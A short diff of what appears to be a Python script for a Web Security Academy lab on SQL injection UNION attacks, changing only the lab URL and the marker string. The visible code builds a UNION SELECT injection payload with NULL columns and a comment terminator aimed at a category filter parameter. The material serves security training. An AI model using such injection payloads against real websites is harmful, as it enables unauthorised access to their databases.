@@ -2,7 +2,7 @@
 # Union 2 - Finding columns with a useful data type in an SQL injection UNION attack
 
 import requests
-url = "https://ac8b1fda1e62f69d802f326900ff00df.web-security-academy.net/filter?category=Lifestyle"
+url = "https://ace91f191e10345d80a30dbf006100af.web-security-academy.net/filter?category=Lifestyle"
 
 def enum_columns():
     '''
@@ -20,7 +20,7 @@ def generate_payload(size, loop_no):
     Generates a payload containing the string to be matched iterating over the number of columns
     '''
     nulls = ['NULL']*size
-    nulls[loop_no] = "'3fe8IR'" # String to be matched - given in the exercise
+    nulls[loop_no] = "'e9dpI1'" # String to be matched - given in the exercise
     payload = "' UNION SELECT "
     payload += ",".join(nulls)
     payload += "--"
